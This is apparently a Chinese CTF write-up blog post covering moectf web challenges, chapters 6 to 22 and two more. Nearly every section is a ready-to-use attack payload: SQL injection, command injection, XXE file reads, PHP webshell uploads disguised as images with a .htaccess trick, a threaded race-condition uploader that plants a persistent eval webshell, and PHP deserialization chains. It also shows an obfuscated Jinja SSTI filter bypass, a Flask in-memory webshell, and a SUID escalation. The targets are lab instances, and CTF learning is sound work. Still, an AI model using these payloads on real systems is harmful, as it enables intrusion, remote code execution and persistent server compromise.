<h3 id="06-第六章-藏经禁制？玄机初探！"><a href="#06-第六章-藏经禁制？玄机初探！" class="headerlink" title="06 第六章 藏经禁制？玄机初探！"></a>06 第六章 藏经禁制？玄机初探！</h3><p>为sql注入，时间盲注，sqlmap一把梭即可,获得flag：moectf{WElcom3_tO-5ql_INjECTlON!115fd4535}</p>
<h3 id="07-第七章-灵蛛探穴与阴阳双生符"><a href="#07-第七章-灵蛛探穴与阴阳双生符" class="headerlink" title="07 第七章 灵蛛探穴与阴阳双生符"></a>07 第七章 灵蛛探穴与阴阳双生符</h3><p>由题目提示，访问robots.txt,获得路径：flag.php,访问后发现是一个简单的比较，需要a !&#x3D; b,但md5(a) &#x3D; md5(b)才能得到flag。如果直接进行MD5碰撞的话过于困难。这里引入一个知识点，php的数字支持科学计数法，比如1e100代表1x10的一百次。所以，我可以构造0e 开头的值，这样就都等于0也就是相等。以下这几个MD5加密后都是0e开头.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">240610708</span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br></pre></td></tr></table></figure>

<p>随便挑选两个输入，得到flag：<em>moectf{MDS_ls_nOt_sAFe!!2346ac3aabc}</em></p>
<h3 id="08-第八章-天衍真言，星图显圣"><a href="#08-第八章-天衍真言，星图显圣" class="headerlink" title="08 第八章 天衍真言，星图显圣"></a>08 第八章 天衍真言，星图显圣</h3><p>仍旧是sqlmap一把梭。</p>
<h3 id="09-第九章-星墟禁制·天机问路"><a href="#09-第九章-星墟禁制·天机问路" class="headerlink" title="09 第九章 星墟禁制·天机问路"></a>09 第九章 星墟禁制·天机问路</h3><p>推测为执行系统命令curl，然后字符串拼接，输入 <code>1 &amp; env</code>得到flag。本题为动态flag</p>
<h3 id="10-第十章-天机符阵-revenge"><a href="#10-第十章-天机符阵-revenge" class="headerlink" title="10 第十章 天机符阵_revenge"></a>10 第十章 天机符阵_revenge</h3><p>简单的xxe注入，payload如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE xxe [&lt;!ENTITY xxe SYSTEM &quot;file:///flag.txt&quot;&gt;]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">    &lt;ctfshow&gt;&amp;xxe;&lt;/ctfshow&gt;</span><br><span class="line">    &lt;解析&gt;&amp;xxe;&lt;/解析&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure>

<h3 id="11-第十一章-千机变·破妄之眼"><a href="#11-第十一章-千机变·破妄之眼" class="headerlink" title="11 第十一章 千机变·破妄之眼"></a>11 第十一章 千机变·破妄之眼</h3><p>由题，使用脚本生成脚本然后爆破，得到路径&#x2F;find.php。</p>
<p>查看flag.php发现看不到flag，推测flag被注释掉了或者隐藏，使用伪协议base64加密再读取。</p>
<p>payload：<code>php://filter/read=convert.base64-encode/resource=./flag.php</code></p>
<p>然后在base64解密就可以获得flag</p>
<h3 id="12-第十二章-玉魄玄关·破妄"><a href="#12-第十二章-玉魄玄关·破妄" class="headerlink" title="12 第十二章 玉魄玄关·破妄"></a>12 第十二章 玉魄玄关·破妄</h3><p>使用蚁剑连接然后翻下目录就可以找到flag。</p>
<h3 id="13-第十三章-通幽关·灵纹诡影"><a href="#13-第十三章-通幽关·灵纹诡影" class="headerlink" title="13 第十三章 通幽关·灵纹诡影"></a>13 第十三章 通幽关·灵纹诡影</h3><p>文件上传，创建一个shell.php,里面写上<code>&lt;?=`$_POST[1]`?&gt;</code>,然后用010打开，为它添加上jpg的文件头，成功上传，然后访问上传的文件就可以rce了，使用指令env获得flag</p>
<h3 id="14-第十四章-御神关·补天玉碑"><a href="#14-第十四章-御神关·补天玉碑" class="headerlink" title="14 第十四章 御神关·补天玉碑"></a>14 第十四章 御神关·补天玉碑</h3><p>依旧是文件上传,创建一个shell.php,里面写上<code>&lt;?=`$_POST[1]`?&gt;</code>,然后改名为shell.png,添加文件头尾，然后创建.htaccess文件，写入<code>&lt;FilesMatch &quot;.png&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code>然后添加文件头尾，改叫set.png,最后依次上传，在bp中将set.png改名叫.htaccess。最后访问shell.png实现rce,执行 env获得flag</p>
<h3 id="15-第十五章-归真关·竞时净魔"><a href="#15-第十五章-归真关·竞时净魔" class="headerlink" title="15 第十五章 归真关·竞时净魔"></a>15 第十五章 归真关·竞时净魔</h3><p>条件竞争文件上传。由于服务器是先保存上传的文件在改名，所以我们可以趁服务器改名前访问我们上传的文件从而getshell。脚本如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"># --- 配置区 ---</span><br><span class="line"># 请根据你的实际情况修改目标地址和端口</span><br><span class="line">TARGET_HOST = &quot;127.0.0.1&quot;</span><br><span class="line">TARGET_PORT = &quot;50762&quot;</span><br><span class="line"></span><br><span class="line"># 上传路径和最终 shell 的路径</span><br><span class="line">UPLOAD_URL = f&quot;http://&#123;TARGET_HOST&#125;:&#123;TARGET_PORT&#125;/upload.php&quot;</span><br><span class="line">ACCESS_URL = f&quot;http://&#123;TARGET_HOST&#125;:&#123;TARGET_PORT&#125;/uploads/shell.php&quot;</span><br><span class="line">FINAL_SHELL_URL = f&quot;http://&#123;TARGET_HOST&#125;:&#123;TARGET_PORT&#125;/shell.php&quot;</span><br><span class="line"></span><br><span class="line"># 设置并发线程数</span><br><span class="line">THREAD_COUNT = 50</span><br><span class="line"></span><br><span class="line"># --- 全局标志位 ---</span><br><span class="line"># 一旦成功，就将此标志设置为 True，停止所有线程</span><br><span class="line">RACE_SUCCESS = False</span><br><span class="line"></span><br><span class="line"># --- “滴管”文件定义 ---</span><br><span class="line"># 这是我们要上传的文件的内容和元数据</span><br><span class="line"># 文件名可以随意，但内容必须是滴管代码</span><br><span class="line">dropper_file_content = &#x27;&lt;?php file_put_contents(&quot;../shell.php&quot;, \&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;\&#x27;); ?&gt;&#x27;</span><br><span class="line">files_payload = &#123;</span><br><span class="line">    &#x27;upload_file&#x27;: (&#x27;shell.php&#x27;, dropper_file_content, &#x27;application/octet-stream&#x27;)</span><br><span class="line">&#125;</span><br><span class="line">form_data = &#123;</span><br><span class="line">    &#x27;submit&#x27;: &#x27;上传&#x27;  # 对应请求包中的 &quot;ä¸Šä¼ &quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def uploader():</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    上传线程：循环发送文件上传请求</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    global RACE_SUCCESS</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    while not RACE_SUCCESS:</span><br><span class="line">        try:</span><br><span class="line">            session.post(UPLOAD_URL, files=files_payload, data=form_data, timeout=1)</span><br><span class="line">            # 打印&#x27;U&#x27;表示正在上传</span><br><span class="line">            sys.stdout.write(&#x27;U&#x27;)</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">        except requests.exceptions.RequestException:</span><br><span class="line">            # 在高并发下，连接错误是正常的，忽略即可</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def accessor():</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    访问线程：循环访问可能存在的滴管文件</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    global RACE_SUCCESS</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    while not RACE_SUCCESS:</span><br><span class="line">        try:</span><br><span class="line">            session.get(ACCESS_URL, timeout=1)</span><br><span class="line">            # 打印&#x27;A&#x27;表示正在访问</span><br><span class="line">            sys.stdout.write(&#x27;A&#x27;)</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">        except requests.exceptions.RequestException:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def checker():</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    检查线程：持续检查最终的 shell 是否已经生成</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    global RACE_SUCCESS</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    test_command = &#x27;echo &quot;SUCCESS&quot;;&#x27;</span><br><span class="line">    while not RACE_SUCCESS:</span><br><span class="line">        try:</span><br><span class="line">            response = session.post(FINAL_SHELL_URL, data=&#123;&#x27;cmd&#x27;: test_command&#125;, timeout=2)</span><br><span class="line">            # 检查响应中是否包含我们预期的成功标志</span><br><span class="line">            if response.status_code == 200 and &quot;SUCCESS&quot; in response.text:</span><br><span class="line">                print(&quot;\n\n[+] ===== [ RACE CONDITION SUCCESS! ] =====&quot;)</span><br><span class="line">                print(f&quot;[+] 永久 Webshell 已经成功生成: &#123;FINAL_SHELL_URL&#125;&quot;)</span><br><span class="line">                print(f&quot;[+] 现在你可以使用蚁剑或 curl 等工具连接它。&quot;)</span><br><span class="line">                print(f&quot;[+] 例如: curl -X POST -d \&quot;cmd=system(&#x27;ls -la&#x27;);\&quot; &#123;FINAL_SHELL_URL&#125;&quot;)</span><br><span class="line">                RACE_SUCCESS = True  # 设置成功标志，停止所有线程</span><br><span class="line">                break</span><br><span class="line">        except requests.exceptions.RequestException:</span><br><span class="line">            # 目标 shell 还未生成，继续等待</span><br><span class="line">            time.sleep(0.1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    print(f&quot;[*] 目标地址: &#123;TARGET_HOST&#125;:&#123;TARGET_PORT&#125;&quot;)</span><br><span class="line">    print(f&quot;[*] 启动 &#123;THREAD_COUNT * 2&#125; 个线程进行条件竞争...&quot;)</span><br><span class="line">    print(&quot;[*] U = 上传请求, A = 访问请求&quot;)</span><br><span class="line">    print(&quot;[*] 脚本将持续运行，直到在根目录成功生成 shell.php...&quot;)</span><br><span class="line"></span><br><span class="line">    threads = []</span><br><span class="line"></span><br><span class="line">    # 启动一个检查线程</span><br><span class="line">    checker_thread = threading.Thread(target=checker)</span><br><span class="line">    threads.append(checker_thread)</span><br><span class="line">    checker_thread.start()</span><br><span class="line"></span><br><span class="line">    # 启动多个上传和访问线程</span><br><span class="line">    for _ in range(THREAD_COUNT):</span><br><span class="line">        uploader_thread = threading.Thread(target=uploader)</span><br><span class="line">        threads.append(uploader_thread)</span><br><span class="line">        uploader_thread.start()</span><br><span class="line"></span><br><span class="line">        accessor_thread = threading.Thread(target=accessor)</span><br><span class="line">        threads.append(accessor_thread)</span><br><span class="line">        accessor_thread.start()</span><br><span class="line"></span><br><span class="line">    # 等待所有线程结束（当RACE_SUCCESS为True时）</span><br><span class="line">    for thread in threads:</span><br><span class="line">        thread.join()</span><br><span class="line"></span><br><span class="line">    print(&quot;\n[*] 脚本执行完毕。&quot;)</span><br></pre></td></tr></table></figure>

<p>然后访问&#x2F;shell.php即可getshell。</p>
<h3 id="16-第十六章-昆仑星途"><a href="#16-第十六章-昆仑星途" class="headerlink" title="16 第十六章 昆仑星途"></a>16 第十六章 昆仑星途</h3><p>文件包含漏洞，尝试发现data伪协议可用，实现rce。</p>
<p>payload:<code>http://127.0.0.1:63768/?file=data://plain/text,&lt;?php system(&#39;tac /flag-VM4gaIgwcIg7m1R62FPhq0CdYe710z.txt&#39;);?&gt;</code></p>
<p>得到flag</p>
<h3 id="17-第十七章-星骸迷阵·神念重构"><a href="#17-第十七章-星骸迷阵·神念重构" class="headerlink" title="17 第十七章 星骸迷阵·神念重构"></a>17 第十七章 星骸迷阵·神念重构</h3><p>简单的php反序列化漏洞，__destruct()方法会在类销毁时得到执行，所以只需需改A类中的a属性即可getshell，获得payload的脚本如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class A &#123;</span><br><span class="line">    public $a;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        eval($this-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new A;</span><br><span class="line">$a-&gt;a=&quot;system(&#x27;env&#x27;);&quot;;</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="18-第十八章-万卷诡阁·功法连环"><a href="#18-第十八章-万卷诡阁·功法连环" class="headerlink" title="18 第十八章 万卷诡阁·功法连环"></a>18 第十八章 万卷诡阁·功法连环</h3><p>依旧是简单的反序列化，把private改为public即可，payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/*</span><br><span class="line"> * @Author: Ikalovic 2298268003@qq.com</span><br><span class="line"> * @Date: 2025-08-17 19:39:44</span><br><span class="line"> * @LastEditors: Ikalovic 2298268003@qq.com</span><br><span class="line"> * @LastEditTime: 2025-08-25 16:59:16</span><br><span class="line"> * @FilePath: \undefinedc:\Users\30882\Desktop\1.php</span><br><span class="line"> * @Description: 这是默认设置,请设置`customMade`, 打开koroFileHeader查看配置 进行设置: https://github.com/OBKoro1/koro1FileHeader/wiki/%E9%85%8D%E7%BD%AE</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">class PersonA &#123;</span><br><span class="line">    public $name;</span><br><span class="line">    function __wakeup() &#123;</span><br><span class="line">        $name=$this-&gt;name;</span><br><span class="line">        $name-&gt;work();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonB &#123;</span><br><span class="line">    public $name;</span><br><span class="line">    function work()&#123;</span><br><span class="line">        $name=$this-&gt;name;</span><br><span class="line">        eval($name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new PersonB;</span><br><span class="line">$a-&gt;name=&quot;system(&#x27;env&#x27;);&quot;;</span><br><span class="line">$b = new PersonA;</span><br><span class="line">$b-&gt;name=$a;</span><br><span class="line">echo serialize($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="19-第十九章-星穹真相·补天归源"><a href="#19-第十九章-星穹真相·补天归源" class="headerlink" title="19 第十九章 星穹真相·补天归源"></a>19 第十九章 星穹真相·补天归源</h3><p>payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Person &#123;&#125;</span><br><span class="line">class PersonA extends Person &#123;&#125;</span><br><span class="line">class PersonC extends Person &#123;&#125;</span><br><span class="line"></span><br><span class="line">$a = new PersonA();</span><br><span class="line">$c = new PersonC();</span><br><span class="line"></span><br><span class="line">$c-&gt;name = &quot;system&quot;;   // __Check 里会调用 system()</span><br><span class="line">$c-&gt;age  = &quot;xxx&quot;;      // 避免包含 flag</span><br><span class="line"></span><br><span class="line">$a-&gt;name = $c;         // PersonA::name = PersonC</span><br><span class="line">$a-&gt;id   = &quot;__Check&quot;;  // 调用 PersonC-&gt;__Check()</span><br><span class="line">$a-&gt;age  = &quot;cat /flag&quot;; // 作为 system() 参数</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="19-第十九章-revenge"><a href="#19-第十九章-revenge" class="headerlink" title="19 第十九章_revenge"></a>19 第十九章_revenge</h3><p>payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonA extends Person</span><br><span class="line">&#123;</span><br><span class="line">    // __destruct 方法是我们的触发器</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonC extends Person</span><br><span class="line">&#123;</span><br><span class="line">    // check 方法是我们的执行点</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 1. 创建攻击链所需的对象</span><br><span class="line">$a = new PersonA();</span><br><span class="line">$c = new PersonC();</span><br><span class="line"></span><br><span class="line">// 2. 配置 PersonA 对象的属性，让它在销毁时调用 PersonC-&gt;check()</span><br><span class="line">$a-&gt;name = $c;</span><br><span class="line">$a-&gt;id = &quot;check&quot;;</span><br><span class="line">$a-&gt;age = &quot;id&quot;; // 你想执行的命令, 比如 &#x27;ls -la&#x27;, &#x27;cat /flag&#x27;</span><br><span class="line"></span><br><span class="line">// 3. 配置 PersonC 对象的属性，让它调用 system 函数</span><br><span class="line">$c-&gt;name = &quot;SyStEm&quot;; // 大小写绕过 === 检查</span><br><span class="line"></span><br><span class="line">// 4. 生成序列化字符串</span><br><span class="line">$payload = serialize($a);</span><br><span class="line"></span><br><span class="line">// 5. URL 编码后输出</span><br><span class="line">echo urlencode($payload);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="20-第二十章-幽冥血海·幻语心魔"><a href="#20-第二十章-幽冥血海·幻语心魔" class="headerlink" title="20 第二十章 幽冥血海·幻语心魔"></a>20 第二十章 幽冥血海·幻语心魔</h3><p> 标准的ssti，fenjing一把梭即可。</p>
<h3 id="21-第二十一章-往生漩涡·言灵死局"><a href="#21-第二十一章-往生漩涡·言灵死局" class="headerlink" title="21 第二十一章 往生漩涡·言灵死局"></a>21 第二十一章 往生漩涡·言灵死局</h3><p>在前面的基础上添加了黑名单。<code>blacklist = [&quot;__&quot;, &quot;global&quot;, &quot;&#123;&#123;", "&#125;&#125;&quot;]</code></p>
<p>依旧fenjing一把梭,payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=&#123;%set ne=dict(NEXT=i)|first|lower%&#125;&#123;%set qb=dict(GET=i)|first|lower%&#125;&#123;%set wq=dict(OS=i)|first|lower%&#125;&#123;%set po=dict(POPEN=i)|first|lower%&#125;&#123;%set re=dict(READ=i)|first|lower%&#125;&#123;%set fa=dict(GLOBALS=i)|first|lower%&#125;&#123;%set da=(&#123;&#125;|e|urlencode|first)%&#125;&#123;%set rk=(da,dict(c=i)|join)|join%&#125;&#123;%set wy=(x,)|count%&#125;&#123;%set ni=(wy,wy)|sum%&#125;&#123;%set cw=(wy,wy,wy,wy)|sum%&#125;&#123;%set bc=(wy,wy,wy,wy,wy)|sum%&#125;&#123;%set so=(bc,bc)|sum*(bc)%&#125;&#123;%set sj=(bc,wy,wy,wy)|sum%&#125;&#123;%set zz=(bc,wy)|sum%&#125;&#123;%set aq=(wy,wy,wy)|sum%&#125;&#123;%set wp=(bc,wy,wy,wy,wy)|sum%&#125;&#123;%set ta=(rk*wp)%((wp,wp,wp,ni)|sum*(cw),(so,wp,wp,wp,wp,wp,ni)|sum,(wp,ni)|sum*(wp),(sj)*(cw),(wp,wp,wp,wp,wp,ni)|sum,(wp,sj)|sum*(zz),(wp,aq)|sum*(wp),(so,wp,wp,wp,wp,wp,ni)|sum,(so,so,aq)|sum)%&#125;&#123;%set on=e|map(e)|e|list|batch((wp,wp,sj)|sum)|first|last%&#125;&#123;%set ea=(on,on)|join%&#125;&#123;%set yr=(ea,fa,ea)|join%&#125;&#123;%print cycler|attr(ne)|attr(yr)|attr(qb)(wq)|attr(po)(ta)|attr(re)()%&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="22-第二十二章-血海核心·千年手段"><a href="#22-第二十二章-血海核心·千年手段" class="headerlink" title="22 第二十二章 血海核心·千年手段"></a>22 第二十二章 血海核心·千年手段</h3><p>无回显ssti,打内存马，payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())\&quot;)==None else resp)&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;sys&#x27;].modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>然后get传参cmd即可getshell</p>
<p>访问flag发现无内容，ls -l 发现为root可读，考虑提权。</p>
<p>采取suid提权，使用rev指令发现无反应。</p>
<p>用base64读取rev文件内容，然后再解码，丢进ida，得到如下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int i; // [rsp+1Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  for ( i = 1; argc &gt; i + 1; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( !strcmp(&quot;--HDdss&quot;, argv[i]) )</span><br><span class="line">      execvp(argv[i + 1], (char *const *)&amp;argv[i + 1]);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来就显而易见了，payload:<code>rev --HDdss tac /flag</code></p>
<p>得到flag。</p>
<h3 id="摸金偶遇FLAG，拼尽全力难战胜"><a href="#摸金偶遇FLAG，拼尽全力难战胜" class="headerlink" title="摸金偶遇FLAG，拼尽全力难战胜"></a>摸金偶遇FLAG，拼尽全力难战胜</h3><p>审计代码，发现是js写的小游戏，payload如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// 获取挑战数据并验证</span><br><span class="line">fetch(&#x27;/get_challenge?count=9&#x27;)</span><br><span class="line">  .then(response =&gt; response.json())</span><br><span class="line">  .then(data =&gt; &#123;</span><br><span class="line">    const numbers = data.numbers;</span><br><span class="line">    const token = data.token;</span><br><span class="line">    // 发送验证请求</span><br><span class="line">    return fetch(&#x27;/verify&#x27;, &#123;</span><br><span class="line">      method: &#x27;POST&#x27;,</span><br><span class="line">      headers: &#123;</span><br><span class="line">        &#x27;Content-Type&#x27;: &#x27;application/json&#x27;</span><br><span class="line">      &#125;,</span><br><span class="line">      body: JSON.stringify(&#123; answers: numbers, token: token &#125;)</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;)</span><br><span class="line">  .then(response =&gt; response.json())</span><br><span class="line">  .then(data =&gt; &#123;</span><br><span class="line">    if (data.correct) &#123;</span><br><span class="line">      console.log(&#x27;Flag:&#x27;, data.flag);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      console.log(&#x27;Failed:&#x27;, data.message);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  .catch(error =&gt; console.error(&#x27;Error:&#x27;, error));</span><br></pre></td></tr></table></figure>

<p>直接打开f12，在控制台输入上面的代码即可获得flag</p>
<h3 id="这是…Webshell？"><a href="#这是…Webshell？" class="headerlink" title="这是…Webshell？"></a>这是…Webshell？</h3><p>打开后，页面给出源代码。</p>
